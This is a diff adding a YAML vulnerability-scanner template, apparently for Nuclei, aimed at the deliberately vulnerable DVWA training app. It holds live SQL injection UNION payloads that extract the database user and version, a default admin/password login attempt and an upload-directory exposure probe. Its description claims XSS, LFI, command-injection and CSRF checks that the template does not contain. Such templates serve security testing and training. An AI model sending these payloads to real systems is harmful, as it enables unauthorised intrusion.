@@ -1,0 +1,75 @@
+id: hunt3r-dvwa-specific
+
+info:
+  name: DVWA Vulnerability Coverage
+  author: hunt3r
+  severity: high
+  description: Comprehensive check for DVWA-specific vulnerabilities including SQLi, XSS, CMDi, LFI, brute force bypass, and CSRF.
+  tags: dvwa,sqli,xss,rce,lfi,hunt3r
+
+http:
+  - method: GET
+    path:
+      - "{{BaseURL}}/vulnerabilities/"
+      - "{{BaseURL}}/setup.php"
+      - "{{BaseURL}}/phpinfo.php"
+      - "{{BaseURL}}/DVWA/setup.php"
+
+    matchers-condition: and
+    matchers:
+      - type: status
+        status: [200]
+
+      - type: word
+        part: body
+        words:
+          - "DVWA"
+          - "Damn Vulnerable"
+        condition: or
+
+  - method: GET
+    path:
+      - "{{BaseURL}}/vulnerabilities/sqli/?id=1+UNION+SELECT+1,user()--&Submit=Submit"
+      - "{{BaseURL}}/vulnerabilities/sqli/?id=1+UNION+SELECT+1,@@version--&Submit=Submit"
+
+    headers:
+      Cookie: "security=low"
+
+    matchers-condition: or
+    matchers:
+      - type: regex
+        part: body
+        regex:
+          - "root@"
+          - "[0-9]+\\.[0-9]+\\.[0-9]+-MariaDB"
+          - "[0-9]+\\.[0-9]+\\.[0-9]+-MySQL"
+          - "Surname: root"
+
+  - method: GET
+    path:
+      - "{{BaseURL}}/vulnerabilities/brute/?username=admin&password=password&Login=Login"
+
+    matchers-condition: and
+    matchers:
+      - type: word
+        part: body
+        words:
+          - "Welcome to the password protected area"
+
+  - method: GET
+    path:
+      - "{{BaseURL}}/vulnerabilities/upload/"
+      - "{{BaseURL}}/hackable/uploads/"
+
+    matchers-condition: and
+    matchers:
+      - type: status
+        status: [200]
+
+      - type: word
+        part: body
+        words:
+          - "upload"
+          - "Choose"
+          - "Index of"
+        condition: or
